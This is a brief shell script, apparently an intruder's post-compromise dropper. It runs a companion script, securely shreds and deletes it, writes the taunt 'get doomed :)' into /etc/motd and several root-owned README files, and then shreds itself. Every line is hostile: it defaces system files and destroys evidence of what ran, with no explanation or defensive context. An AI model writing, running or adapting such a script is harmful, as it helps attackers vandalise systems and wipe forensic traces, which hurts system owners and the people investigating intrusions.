#! /usr/bin/sh

sh ./process.sh
shred -n 1 -z ./process.sh && rm ./process.sh

echo "get doomed :)" >/etc/motd
echo "get doomed :)" >/fsociety/README.md
echo "get doomed :)" >/root/README.md

shred -n 1 -z "$0" && rm "$0"
